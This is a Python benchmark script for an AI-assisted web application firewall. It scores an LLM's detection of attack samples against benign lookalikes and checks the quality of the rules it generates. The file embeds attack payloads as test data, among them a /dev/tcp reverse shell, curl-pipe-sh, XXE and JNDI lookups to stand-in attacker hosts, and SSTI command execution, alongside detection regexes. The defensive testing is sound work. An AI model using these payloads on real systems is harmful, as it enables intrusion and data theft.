"""AI 研判层离线评测：攻击样本检出率 / 正常样本误报率 / 规则质量 / 延迟。

用途：为「AI 补漏」这一层建立可量化的基准。每次改粗筛、prompt、模型后重跑，
对比数字即可判断改动是否有效。

用法：
    python -m aiwaf.benchmark                 # 内置 v2 语料
    python -m aiwaf.benchmark --dataset external   # 外部语料（SecLists/PAT）
    python -m aiwaf.benchmark --dataset all        # 内置 + 外部
    python -m aiwaf.benchmark --category sqli      # 只测某类
    python -m aiwaf.benchmark --limit 20           # 只测前 20 条
    python -m aiwaf.benchmark --runs 3             # 多轮均值 ± 标准差
    python -m aiwaf.benchmark --json bench_out.json

要求：本地 LLM 已启动（默认 http://127.0.0.1:1234）。
"""
import argparse
import json
import os
import re
import time

from . import config
from .engine import (MISS_SUSPECT_RE, _fix_broken_regex, _llm_anchor_rule,
                     _repair_rule, _resolve_rule_ex, _regex_risky,
                     _regex_specific_enough)
from .llm_client import LlmClient

# 外部语料由 tools/build_external_corpus.py 生成
EXTERNAL_CORPUS = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "corpus", "external", "attack_samples.jsonl")

# ---- 攻击样本：(类别, 名称, payload) ----
# 选取原则：以「变形/绕过」为主，模拟雷池第一线规则可能漏判、需要 AI 补漏的场景。
ATTACK_SAMPLES = [
    # SQL 注入
    ("sqli", "union_select", "1 union select username,password from users"),
    ("sqli", "or_true", "1' or '1'='1"),
    ("sqli", "time_sleep", "1 AND sleep(5)"),
    ("sqli", "benchmark", "1' AND BENCHMARK(1000000,SHA1('x'))--"),
    ("sqli", "infoschema", "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0"),
    ("sqli", "waitfor", "1;WAITFOR DELAY '0:0:5'--"),
    ("sqli", "comment_bypass", "admin'--"),
    ("sqli", "url_encoded", "%27%20or%201%3D1%23"),
    ("sqli", "paren_wrap", "1) OR 1=1--"),
    ("sqli", "pg_sleep", "1; SELECT pg_sleep(10);--"),
    # XSS
    ("xss", "svg_onload", "<svg onload=alert(1)>"),
    ("xss", "img_onerror", "<img src=x onerror=alert(document.cookie)>"),
    ("xss", "js_pseudo", "javascript:alert(1)"),
    ("xss", "script_tag", "<script>alert(1)</script>"),
    ("xss", "attr_break", "\"><img src=x onerror=prompt(1)>"),
    ("xss", "body_onload", "<body onload=alert(1)>"),
    ("xss", "iframe", "<iframe src=javascript:alert(1)>"),
    ("xss", "semicolon_inject", "';alert(1);//"),
    # 命令注入
    ("cmdi", "pipe", "|id"),
    ("cmdi", "semicolon", ";whoami"),
    ("cmdi", "dollar_sub", "$(cat /etc/passwd)"),
    ("cmdi", "backtick", "`ls -la`"),
    ("cmdi", "pipe_ping", "|ping -c 10 127.0.0.1"),
    ("cmdi", "double_amp", "&& net user"),
    ("cmdi", "url_encoded_pipe", "%7Cid"),
    ("cmdi", "rev_shell", "1; /bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"),
    # 路径穿越
    ("traversal", "dotdot", "../../etc/passwd"),
    ("traversal", "single_enc", "..%2f..%2f..%2fetc%2fpasswd"),
    ("traversal", "dot_slash_mix", "....//....//etc/passwd"),
    ("traversal", "double_enc", "..%252f..%252fetc/passwd"),
    ("traversal", "null_byte", "/etc/passwd%00.jpg"),
    # SSRF
    ("ssrf", "cloud_metadata", "http://169.254.169.254/latest/meta-data/"),
    ("ssrf", "local_redis", "http://127.0.0.1:6379/"),
    ("ssrf", "file_scheme", "file:///etc/passwd"),
    ("ssrf", "gopher", "gopher://127.0.0.1:6379/_INFO"),
    ("ssrf", "metadata_enc_dot", "http://169.254.169.254%2e%2f"),
    # SSTI 模板注入
    ("ssti", "el_expr", "${7*7}"),
    ("ssti", "spel_expr", "#{7*7}"),
    ("ssti", "jinja_expr", "{{7*7}}"),
    ("ssti", "thymeleaf_expr", "@{7*7}"),
    ("ssti", "java_runtime", "${''.class.forName('java.lang.Runtime')}"),
    ("ssti", "python_globals", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
    ("ssti", "nested_el", "${{7*7}}"),
    # XXE / XML
    ("xxe", "entity_inline", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"),
    ("xxe", "param_entity", "<!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/hosts\"> %file;]>"),
    ("xxe", "oob", "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">]><r>&xxe;</r>"),
    # 反序列化
    ("deser", "php_serialized", "O:8:\"stdClass\":1:{s:1:\"a\";s:3:\"bcd\";}"),
    ("deser", "java_header", "aced0005737200"),
    ("deser", "ysoserial", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA"),
    # ---- v2 扩充：更难的变形与绕过样本 ----
    # SQL 注入变种
    ("sqli", "inline_comment", "1'/**/UNION/**/SELECT/**/NULL--"),
    ("sqli", "case_mix", "1 uNiOn SeLeCt 1,2,3"),
    ("sqli", "char_eq", "1' OR 'a'='a"),
    ("sqli", "stacked_drop", "1; DROP TABLE users--"),
    ("sqli", "oob_dns", "1'; DECLARE @q VARCHAR(99); EXEC master..xp_dirtree '\\\\attacker.com\\a'--"),
    ("sqli", "double_url", "%2527%2520or%25201%253D1"),
    # XSS 变种
    ("xss", "onfocus", "<input autofocus onfocus=alert(1)>"),
    ("xss", "svg_animate", "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"),
    ("xss", "encoded_script", "%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
    ("xss", "data_uri", "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>"),
    ("xss", "svg_slash", "'\"><svg/onload=confirm(1)>"),
    # 命令注入变种
    ("cmdi", "newline_id", "%0aid"),
    ("cmdi", "space_pipe", "|  id"),
    ("cmdi", "base64_pipe", "echo aWQ=|base64 -d|sh"),
    ("cmdi", "curl_pipe_sh", "|curl http://evil.sh|sh"),
    ("cmdi", "semicolon_cat_lt", ";cat</etc/passwd"),
    ("cmdi", "ifs_bypass", "$(IFS=cat$IFS/etc/passwd)"),
    # 路径穿越变种
    ("traversal", "overlong_utf8", "..%c0%af..%c0%afetc/passwd"),
    ("traversal", "backslash_win", "..%5c..%5cwindows%5cwin.ini"),
    ("traversal", "within_path", "/var/www/../../etc/passwd"),
    ("traversal", "semicolon_path", "..;/..;/etc/passwd"),
    ("traversal", "encoded_dot", "%2e%2e/%2e%2e/etc/passwd"),
    # SSRF 变种
    ("ssrf", "decimal_ip", "http://2130706433/"),
    ("ssrf", "hex_ip", "http://0x7f000001/"),
    ("ssrf", "ipv6_loopback", "http://[::1]:6379/"),
    ("ssrf", "dns_rebind", "http://localtest.me:8080/"),
    ("ssrf", "imdsv2_token", "http://169.254.169.254/latest/api/token"),
    # SSTI 变种
    ("ssti", "freemarker_exec", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"),
    ("ssti", "velocity_set", "#set($x=7*7)$x"),
    ("ssti", "twig_filter", "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}"),
    ("ssti", "smarty_php", "{php}echo `id`;{/php}"),
    ("ssti", "groovy_class", "${''.getClass().forName('java.lang.Runtime')}"),
    # XXE / XML 变种
    ("xxe", "xinclude", "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"),
    ("xxe", "utf16_doctype", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]>"),
    ("xxe", "entity_http_dtd", "<!DOCTYPE r SYSTEM \"http://attacker.com/evil.dtd\"><r>&xxe;</r>"),
    # 反序列化变种
    ("deser", "php_nested", "O:7:\"Monolog\":1:{s:1:\"a\";O:8:\"stdClass\":0:{}}"),
    ("deser", "java_priorityqueue", "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ"),
    ("deser", "python_pickle", "cos\nsystem\n(S'id'\ntR."),
    # NoSQL 注入
    ("nosql", "mongo_ne", "username[$ne]=admin&password[$ne]=x"),
    ("nosql", "mongo_where", "{\"$where\":\"sleep(5000)\"}"),
    # CRLF 头注入
    ("crlf", "set_cookie", "%0d%0aSet-Cookie:admin=1"),
    ("crlf", "location", "next=%0d%0aLocation:%20http://evil.com"),
    # LDAP 注入
    ("ldap", "filter_or", "*)(uid=*))(|(uid=*"),
    # JNDI / Log4Shell
    ("jndi", "log4shell", "${jndi:ldap://evil.com/a}"),
]

# ---- 正常样本：(名称, payload) ----
# 选取原则：大量「长得像攻击」的正常业务（含敏感词、单引号、HTML 富文本、
# URL 编码等），专门用来压误报率——AI 补漏系统最怕的就是这个。
NORMAL_SAMPLES = [
    ("plain_hello", "hello world"),
    ("cn_query", "你好世界&page=2"),
    ("normal_admin_name", "id=123&name=admin"),
    ("keyword_sleep", "sleep"),
    ("keyword_select", "search=select 查询语句示例"),
    ("normal_url_param", "url=https://example.com/page?id=1"),
    ("math_expr", "msg=1+1=2"),
    ("normal_file", "file=report_2026.pdf"),
    ("keyword_class", "query=java.lang.String 类"),
    ("api_path", "path=/api/v1/users?filter=active"),
    ("apostrophe_name", "name=O'Brien"),
    ("normal_logic", "content=we have 2 apples and 1>0 is true"),
    ("admin_redirect", "/admin/login?redirect=/dashboard"),
    ("jsonp_callback", "callback=jsonp_cb&data=1"),
    ("lang_theme", "lang=en-US&theme=dark"),
    ("cn_math_question", "q=1 AND 2=2 这种数学题"),
    ("richtext_html", "<p>这是富文本，含 <b>加粗</b> 与 script 字样说明</p>"),
    ("sku_ids", "sku=1,2,3&cat=electronics"),
    ("date_range", "start=2026-01-01&end=2026-01-31"),
    ("search_cookie_word", "q=document.cookie 是什么含义"),
    ("uuid_param", "token=550e8400-e29b-41d4-a716-446655440000"),
    ("jwt_like", "auth=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature"),
    # ---- v2 扩充：更多"长得像攻击"的正常业务 ----
    ("email_param", "contact=admin@example.com"),
    ("cn_encoded", "q=%E4%BD%A0%E5%A5%BD"),
    ("css_calc", "style=width:calc(100%-20px)"),
    ("bash_doc", "q=如何在 bash 中定义函数"),
    ("sql_doc", "q=SELECT 语句的基本语法"),
    ("jndi_doc", "q=log4j 漏洞是什么"),
    ("image_path", "path=/static/assets/logo.png"),
    ("version_param", "v=1.2.3&build=20261123"),
    ("sort_param", "sort=price&order=desc"),
    ("redirect_https", "redirect=https://example.com/login"),
]


# ---- 外部语料加载 ----
def load_external_attacks(path=None):
    """读取 tools/build_external_corpus.py 生成的 JSONL 语料。

    返回 [(category, name, payload), ...]。正常样本仍使用内置 NORMAL_SAMPLES。
    """
    p = path or EXTERNAL_CORPUS
    if not os.path.exists(p):
        raise SystemExit(
            "外部语料不存在: %s\n请先运行: python tools/build_external_corpus.py" % p)
    out = []
    with open(p, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            row = json.loads(line)
            cat = (row.get("category") or "").strip()
            payload = row.get("payload") or ""
            if not cat or not payload:
                continue
            out.append((cat, row.get("name") or "external", payload))
    return out


# ---- 模拟雷池第一线（已知签名规则） ----
# 只覆盖常见固定特征，故意不覆盖变形/编码变种——这些才是 AI 第二层要补的漏。
# 用途：让端到端指标反映真实链路（先拦一层，漏判才送 AI），避免"所有样本都直接喂 LLM"。
FIRSTLINE_RULES = [
    ("sqli", r"(?i)\bunion\s+(all\s+)?select\b"),
    ("sqli", r"(?i)\bor\s+['\"]?\d+['\"]?\s*=\s*['\"]?\d+"),
    ("sqli", r"(?i)\b(?:sleep|benchmark)\s*\(\s*\d"),
    ("sqli", r"(?i)information_schema"),
    ("sqli", r"(?i)waitfor\s+delay"),
    ("xss", r"(?i)<script"),
    ("xss", r"(?i)javascript:"),
    ("xss", r"(?i)on(?:error|load)\s*="),
    ("cmdi", r"(?i)(?:^|[|;&])\s*(?:id|whoami|cat|ls|bash|sh|ping|wget|curl)\b"),
    ("cmdi", r"\$\([^)]*\)"),
    ("cmdi", r"`[^`]+`"),
    ("traversal", r"\.\./|\.\.\\|%2e%2e"),
    ("ssrf", r"169\.254\.169\.254"),
    ("ssrf", r"(?i)(?:file|gopher|dict|ldap)://"),
    ("ssti", r"\$\{[^}]+\}|\#\{[^}]+\}|\{\{[^{}]*\}\}"),
    ("xxe", r"<!ENTITY|<!DOCTYPE"),
    ("deser", r"O:\d+:|aced00|rO0AB"),
]
_FIRSTLINE_RE = [(c, re.compile(rx)) for c, rx in FIRSTLINE_RULES]


def firstline_block(payload):
    """返回命中的第一线类别（模拟雷池直接拦截），未命中返回 None。"""
    for cat, rx in _FIRSTLINE_RE:
        if rx.search(payload or ""):
            return cat
    return None


def _judge_rule_quality(payload, rule):
    """规则质量三关：可编译 / 能命中触发样本 / 过特指性校验。

    与生产链路口径一致：编译失败时先尝试 _fix_broken_regex 修复。
    """
    if not rule:
        return False, "empty"
    fixed = rule
    try:
        re.compile(fixed)
    except re.error as e:
        fixed = _fix_broken_regex(rule)
        if fixed is None:
            return False, "compile: %s" % e
    if _regex_risky(fixed):
        return False, "redos-risk"
    rx = re.compile(fixed)
    if not rx.search(payload):
        return False, "not-match-sample"
    ok, why = _regex_specific_enough(fixed)
    if not ok:
        return False, "too-broad"
    return True, why


def _analyze(client, payload, host="bench.test"):
    t0 = time.perf_counter()
    a = client.analyze({"host": host, "uri": "/?q=" + payload[:100],
                        "payload": payload})
    ms = (time.perf_counter() - t0) * 1000
    return a, ms


def run(category=None, limit=None, quiet=False, dataset="v2", external_path=None):
    say = (lambda *a, **k: None) if quiet else print
    client = LlmClient()
    if dataset == "v2":
        all_atk = ATTACK_SAMPLES
    elif dataset == "external":
        all_atk = load_external_attacks(external_path)
    elif dataset == "all":
        all_atk = ATTACK_SAMPLES + load_external_attacks(external_path)
    else:
        raise ValueError("unknown dataset: %s" % dataset)
    atk = [s for s in all_atk
           if category in (None, s[0])]
    norm = [s for s in NORMAL_SAMPLES] if category in (None, "normal") else []
    if limit:
        atk = atk[:limit]
        norm = norm[:limit]
    label = {"v2": "内置 v2", "external": "外部语料", "all": "内置 + 外部"}[dataset]
    print("== 数据集: %s ==" % label, flush=True)

    # ---- 攻击样本 ----
    per_cat = {}
    missed = []
    atk_screened = 0
    latencies = []
    confs = []
    rule_gen = 0
    rule_raw_valid = 0
    rule_valid = 0
    rule_repaired = 0
    rule_anchor_valid = 0
    rule_bad = []
    e2e_intercepted = 0
    firstline_blocked = 0
    firstline_detail = {}
    ai_candidates = 0
    ai_detected = 0
    ai_intercepted = 0
    rule_sources = {"model": 0, "anchor": 0, "literal": 0, "syntax": 0}
    total = len(atk)
    print("== 攻击样本 %d 条 ==" % total, flush=True)
    for i, (cat, name, payload) in enumerate(atk, 1):
        fl = firstline_block(payload)
        if fl:
            firstline_blocked += 1
            firstline_detail[fl] = firstline_detail.get(fl, 0) + 1
        else:
            ai_candidates += 1
        a, ms = _analyze(client, payload)
        latencies.append(ms)
        if MISS_SUSPECT_RE.search(payload):
            atk_screened += 1
        hit = a["verdict"] == "attack" and not a.get("_error")
        if hit and not fl:
            ai_detected += 1
        c = per_cat.setdefault(cat, {"total": 0, "detected": 0})
        c["total"] += 1
        if hit:
            c["detected"] += 1
            confs.append(a["confidence"])
        else:
            missed.append({"cat": cat, "name": name,
                           "verdict": a["verdict"],
                           "conf": a["confidence"], "why": a["explain"][:80]})
        resolved = None
        if hit:
            # 端到端拦截：检出 且 有可落地规则（模型正则优先，失败则字面兜底）
            resolved, src = _resolve_rule_ex(
                {"payload": payload}, a, sample=payload)
            if resolved:
                e2e_intercepted += 1
                if not fl:
                    ai_intercepted += 1
                rule_sources[src or "other"] = \
                    rule_sources.get(src or "other", 0) + 1
        if hit and (a.get("suggested_rule") or a.get("rule_anchors")):
            rule_gen += 1
            ok, why = False, "empty"
            if a.get("suggested_rule"):
                ok, why = _judge_rule_quality(payload, a["suggested_rule"])
                if ok:
                    rule_raw_valid += 1
            # 修复后规则质量：确定性修复（词边界/URL 编码/引号/大小写/上下文收紧）
            repaired = _repair_rule(a.get("suggested_rule"), payload)
            anchored = None if repaired else \
                _llm_anchor_rule(payload, a.get("rule_anchors") or [])
            if repaired or anchored:
                rule_valid += 1
                if not ok:
                    if repaired:
                        rule_repaired += 1
                    else:
                        rule_anchor_valid += 1
            else:
                rule_bad.append({"name": name,
                                 "rule": (a.get("suggested_rule") or "")[:80],
                                 "why": why})
        say("  [%d/%d] %-6s %-20s -> %-7s conf=%.2f  %dms  %s" %
            (i, total, cat, name, a["verdict"], a["confidence"], ms,
             "第一线拦截" if fl else "送AI"))

    detected = sum(c["detected"] for c in per_cat.values())
    print("\n----- 攻击样本汇总 -----")
    print("%-12s %6s %6s %8s" % ("类别", "样本数", "检出", "检出率"))
    for cat, c in sorted(per_cat.items()):
        print("%-12s %6d %6d %7.0f%%" %
              (cat, c["total"], c["detected"],
               100.0 * c["detected"] / c["total"]))
    print("%-12s %6d %6d %7.0f%%" %
          ("合计", total, detected, 100.0 * detected / total if total else 0))
    avg_ms = sum(latencies) / len(latencies) if latencies else 0
    avg_conf = sum(confs) / len(confs) if confs else 0
    print("平均研判延迟: %.0f ms/条；检出样本平均置信度: %.2f" %
          (avg_ms, avg_conf))
    print("粗筛(MISS_SUSPECT_RE)命中 %d/%d 条（生产链路中，被雷池漏判且粗筛未命中的攻击到不了 LLM）" %
          (atk_screened, total))
    print("规则质量: 生成 %d 条，原始有效 %d 条，最终有效 %d 条"
          "（可编译+命中样本+过特指性；其中 %d 条靠修复、%d 条靠锚点转正）" %
          (rule_gen, rule_raw_valid, rule_valid, rule_repaired, rule_anchor_valid))
    print("端到端拦截率(全量送AI): %d/%d = %.0f%%（检出 且 规则可落地）" %
          (e2e_intercepted, total, 100.0 * e2e_intercepted / total if total else 0))
    print("模拟雷池第一线: 直接拦截 %d/%d 条 %s；送 AI 研判 %d 条" %
          (firstline_blocked, total,
           str(firstline_detail) if firstline_detail else "", ai_candidates))
    if ai_candidates:
        print("AI 补漏: 检出 %d/%d；成功拦截 %d/%d（AI 补漏贡献率 %.0f%%）" %
              (ai_detected, ai_candidates, ai_intercepted, ai_candidates,
               100.0 * ai_intercepted / ai_candidates))
    overall = firstline_blocked + ai_intercepted
    print("整体端到端: %d/%d = %.0f%%（第一线拦截 + AI 补漏）" %
          (overall, total, 100.0 * overall / total if total else 0))
    print("规则来源: 模型/修复 %d，锚点 %d，字面兜底 %d，语法兜底 %d" %
          (rule_sources.get("model", 0), rule_sources.get("anchor", 0),
           rule_sources.get("literal", 0), rule_sources.get("syntax", 0)))
    safeline_rate = 100.0 * firstline_blocked / total if total else 0
    overall_rate = 100.0 * overall / total if total else 0
    print("SafeLine-only 检出: %d/%d = %.0f%%；AI 增量: +%d 条 (+%.1f pp)" %
          (firstline_blocked, total, safeline_rate,
           overall - firstline_blocked, overall_rate - safeline_rate))
    if missed:
        print("\n漏检明细:")
        for m in missed:
            print("  - [%s] %s -> %s (%.2f) %s" %
                  (m["cat"], m["name"], m["verdict"], m["conf"], m["why"]))
    if rule_bad:
        print("\n无效规则明细:")
        for b in rule_bad:
            print("  - [%s] %r (%s)" % (b["name"], b["rule"], b["why"]))

    # ---- 正常样本 ----
    fp = []
    total_n = len(norm)
    norm_screened = 0
    print("\n== 正常样本 %d 条 ==" % total_n, flush=True)
    for i, (name, payload) in enumerate(norm, 1):
        a, ms = _analyze(client, payload)
        scr = bool(MISS_SUSPECT_RE.search(payload))
        if scr:
            norm_screened += 1
        if a["verdict"] == "attack" and not a.get("_error"):
            fp.append({"name": name, "conf": a["confidence"],
                       "why": a["explain"][:80], "screened": scr})
        say("  [%d/%d] %-22s -> %-7s conf=%.2f  %dms" %
            (i, total_n, name, a["verdict"], a["confidence"], ms))
    print("\n----- 正常样本汇总 -----")
    print("误报 %d 条 / %d 条，误报率 %.0f%%" %
          (len(fp), total_n, 100.0 * len(fp) / total_n))
    scr_fp = [f for f in fp if f.get("screened")]
    print("生产视角：粗筛通过 %d 条（会送 LLM），其中误报 %d 条；未过粗筛 %d 条（生产不会研判）" %
          (norm_screened, len(scr_fp), total_n - norm_screened))
    high = [f for f in fp if f["conf"] >= 0.9]
    if high:
        print("其中高置信(>=0.9)误报 %d 条" % len(high))
    for f in fp:
        print("  - [%s] conf=%.2f %s" % (f["name"], f["conf"], f["why"]))

    return {
        "model": client.model,
        "dataset": dataset,
        "attack": {"total": total, "detected": detected,
                   "rate": round(100.0 * detected / total, 1) if total else 0,
                   "avg_ms": round(avg_ms), "avg_conf": round(avg_conf, 3),
                   "rule_gen": rule_gen, "rule_raw_valid": rule_raw_valid,
                   "rule_valid": rule_valid, "rule_repaired": rule_repaired,
                   "rule_anchor_valid": rule_anchor_valid,
                   "e2e_intercepted": e2e_intercepted,
                   "e2e_rate": round(100.0 * e2e_intercepted / total, 1) if total else 0,
                   "firstline_blocked": firstline_blocked,
                   "firstline_detail": firstline_detail,
                   "ai_candidates": ai_candidates,
                   "ai_detected": ai_detected,
                   "ai_intercepted": ai_intercepted,
                   "ai_contribution": round(100.0 * ai_intercepted / ai_candidates, 1)
                   if ai_candidates else 0,
                   "overall_intercepted": firstline_blocked + ai_intercepted,
                   "overall_rate": round(100.0 * (firstline_blocked + ai_intercepted) / total, 1)
                   if total else 0,
                   "safeline_only_rate": round(100.0 * firstline_blocked / total, 1)
                   if total else 0,
                   "ai_increment_pp": round(
                       100.0 * (firstline_blocked + ai_intercepted - firstline_blocked) / total, 1)
                   if total else 0,
                   "rule_sources": rule_sources,
                   "screened": atk_screened,
                   "per_cat": per_cat, "missed": missed},
        "normal": {"total": total_n, "false_pos": len(fp),
                   "rate": round(100.0 * len(fp) / total_n, 1) if total_n else 0,
                   "screened": norm_screened,
                   "screened_fp": len(scr_fp),
                   "fp": fp},
    }


def main(argv=None):
    ap = argparse.ArgumentParser(description="AI 研判层离线评测")
    ap.add_argument("--category", help="只测某类（sqli/xss/cmdi/traversal/ssrf/ssti/xxe/deser/nosql/crlf/ldap/jndi/normal）")
    ap.add_argument("--limit", type=int, help="只测前 N 条")
    ap.add_argument("--dataset", choices=("v2", "external", "all"), default="v2",
                    help="语料集：v2=内置，external=外部语料，all=两者合并")
    ap.add_argument("--external-path", help="外部语料 JSONL 路径（默认 corpus/external/attack_samples.jsonl）")
    ap.add_argument("--json", help="结果落盘路径，便于历史对比")
    ap.add_argument("--runs", type=int, default=1,
                    help="重复轮数（>1 时输出均值/标准差，抵消单次随机波动）")
    args = ap.parse_args(argv)
    runs_n = max(1, args.runs)
    if runs_n == 1:
        result = run(category=args.category, limit=args.limit,
                     dataset=args.dataset, external_path=args.external_path)
    else:
        import statistics
        runs = []
        for i in range(runs_n):
            print("\n########## RUN %d/%d ##########" % (i + 1, runs_n))
            runs.append(run(category=args.category, limit=args.limit,
                            quiet=i > 0, dataset=args.dataset,
                            external_path=args.external_path))
        keys = ("rate", "e2e_rate", "overall_rate", "ai_contribution",
                "rule_valid", "avg_ms", "avg_conf")
        summary = {}
        for k in keys:
            vals = [float(r["attack"].get(k, 0)) for r in runs]
            summary[k] = {"mean": round(statistics.mean(vals), 1),
                          "std": round(statistics.pstdev(vals), 1)}
        fp_vals = [float(r["normal"]["rate"]) for r in runs]
        summary["fp_rate"] = {"mean": round(statistics.mean(fp_vals), 1),
                              "std": round(statistics.pstdev(fp_vals), 1)}
        print("\n===== %d 轮汇总（均值 ± 标准差）=====" % runs_n)
        names = {"rate": "裸 LLM 检出率%", "e2e_rate": "端到端(全量送AI)%",
                 "overall_rate": "整体端到端%", "ai_contribution": "AI 补漏贡献%",
                 "rule_valid": "规则最终有效(条)", "avg_ms": "平均延迟(ms)",
                 "avg_conf": "平均置信度", "fp_rate": "误报率%"}
        for k, v in summary.items():
            print("  %-22s %.1f ± %.1f" % (names.get(k, k), v["mean"], v["std"]))
        result = {"model": runs[0]["model"], "dataset": args.dataset,
                  "runs": runs, "summary": summary}
    if args.json:
        with open(args.json, "w", encoding="utf-8") as f:
            json.dump(result, f, ensure_ascii=False, indent=2)
        print("\n结果已保存: %s" % args.json)


if __name__ == "__main__":
    main()
